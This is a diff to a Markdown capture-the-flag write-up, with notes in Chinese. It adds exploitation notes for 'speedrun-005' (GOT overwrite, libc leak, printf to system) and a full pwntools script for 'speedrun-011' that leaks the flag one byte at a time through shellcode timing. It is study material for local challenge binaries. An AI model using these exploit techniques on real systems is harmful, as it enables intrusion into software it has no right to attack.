@@ -152,6 +152,10 @@ icon: icon-html
 
 * speedrun-005
 
+  把puts_got改成main_addr，实现多次利用
+
+  泄露libc基址，然后把printf_got改成system
+
   ```python
   from pwn import *
   r = process(['./speedrun-005'],env = {"LD_PRELOAD":"./libc-2.27.so"})
@@ -448,6 +452,45 @@ icon: icon-html
   payload = 'a' * 0x10 + p64(system)
   add_message(payload)
   r.interactive()
+  ```
+
+  
+
+* speedrun-011
+
+  盲注
+
+  跑shellcode前flag被打开，指针在rdi中
+
+  一位一位比较，相同进死循环，不同正常退出
+
+  ```python
+  from pwn import *
+  context(os = 'linux', arch = 'amd64')
+  chars = '_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}'
+  flag = ''
+  while True:
+  	print('fuck')
+  	for i in chars:
+  		r = process('./speedrun-011')
+  		shellasm = '''
+  			xor rax, rax
+  			mov al, byte ptr [rdi+{}]
+  			cmp al, {}
+  			je fuck
+  			mov al, 60
+  			syscall
+  		fuck:
+  			jmp fuck
+  		'''.format(len(flag), ord(i))
+  		shellcode = asm(shellasm)
+  		r.send(shellcode)
+  		if 'Alarm clock' in r.recvall():
+  			flag+=i
+  			print(flag)
+  			break
+  	if flag[-1] == '}':
+  		break
   ```
 
   
